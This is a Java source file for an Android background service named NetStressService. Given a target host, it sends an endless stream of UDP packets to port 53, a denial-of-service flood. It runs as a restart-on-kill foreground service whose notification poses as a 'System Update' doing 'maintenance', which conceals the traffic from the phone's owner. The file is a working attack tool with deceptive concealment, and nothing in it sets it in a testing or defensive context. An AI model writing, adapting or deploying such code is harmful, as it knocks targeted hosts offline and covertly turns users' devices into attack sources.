package com.netstress.ultimate;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.DatagramPacket;

public class NetStressService extends Service {
    private static final String CHANNEL_ID = "NetStressChannel";
    private Thread floodThread;
    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
                "NetStress", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = getSystemService(NotificationManager.class);
            if (mgr != null) mgr.createNotificationChannel(channel);
        }
        startForeground(1, new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Running maintenance")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build());
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String target = intent.getStringExtra("target");
        if (target == null || target.isEmpty()) return START_NOT_STICKY;
        floodThread = new Thread(() -> {
            try {
                InetAddress addr = InetAddress.getByName(target);
                try (DatagramSocket socket = new DatagramSocket()) {
                    byte[] data = new byte[1400];
                    for (int i = 0; i < data.length; i++) data[i] = (byte) 'X';
                    while (true) {
                        DatagramPacket packet = new DatagramPacket(data, data.length, addr, 53);
                        socket.send(packet);
                        // Small delay to avoid excessive CPU
                        Thread.sleep(1);
                    }
                }
            } catch (Exception e) {
                Log.e("NetStress", "UDP flood error", e);
            }
        });
        floodThread.start();
        return START_STICKY;
    }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
